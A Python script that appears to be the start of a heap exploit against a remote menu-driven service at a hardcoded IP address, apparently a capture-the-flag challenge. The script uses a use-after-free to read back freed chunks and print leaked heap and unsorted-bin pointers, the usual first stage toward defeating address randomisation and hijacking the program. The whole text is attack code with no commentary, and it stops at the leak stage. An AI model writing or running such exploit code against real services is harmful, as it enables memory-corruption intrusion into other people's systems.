import socket, struct, time

HOST='52.76.96.108'; PORT=9005

class Conn:
    def __init__(self):
        self.s=socket.socket(); self.s.settimeout(8); self.s.connect((HOST,PORT))
        self.buf=b''
    def read_until(self, delim, timeout=8, maxlen=65536):
        self.s.settimeout(timeout)
        while delim not in self.buf:
            if len(self.buf)>maxlen: raise Exception("buf overflow")
            try:
                d=self.s.recv(8192)
            except socket.timeout:
                raise Exception("TIMEOUT waiting for %r, buf=%r"%(delim, self.buf[-200:]))
            if not d: raise Exception("EOF waiting for %r, buf=%r"%(delim,self.buf[-200:]))
            self.buf+=d
        i=self.buf.index(delim)+len(delim)
        out=self.buf[:i]; self.buf=self.buf[i:]
        return out
    def send(self,b):
        self.s.sendall(b)

def menu(c):
    c.read_until(b'> ')

def create(c, idx, size, data):
    c.send(b'1\n'); c.read_until(b'index: ')
    c.send(str(idx).encode()+b'\n'); c.read_until(b'size: ')
    c.send(str(size).encode()+b'\n'); c.read_until(b'data: ')
    c.send(data); menu(c)

def delete(c, idx):
    c.send(b'3\n'); c.read_until(b'index: ')
    c.send(str(idx).encode()+b'\n'); menu(c)

def edit(c, idx, data):
    c.send(b'2\n'); c.read_until(b'index: ')
    c.send(str(idx).encode()+b'\n'); c.read_until(b'data: ')
    c.send(data); menu(c)

def readn(c, idx):
    c.send(b'4\n'); c.read_until(b'index: ')
    c.send(str(idx).encode()+b'\n')
    r=c.read_until(b'\n')
    # r contains "data: <bytes>\n"
    body=r[len(b'data: '):-1]
    menu(c)
    return body

if __name__=='__main__':
    c=Conn(); menu(c)
    create(c,0,0x80,b'A'*0x80)
    create(c,1,0x80,b'B'*0x80)
    delete(c,0); delete(c,1)
    d=readn(c,1)
    print("heap fd:", d[:8].hex(), hex(struct.unpack('<Q',d[:8])[0]))
    create(c,2,0x500,b'C'*0x500)
    create(c,3,0x500,b'D'*0x500)
    create(c,4,0x20,b'E'*0x20)
    delete(c,2)
    d2=readn(c,2)
    print("unsorted:", d2[:16].hex())
    print("unsorted ptr:", hex(struct.unpack('<Q',d2[:8])[0]))
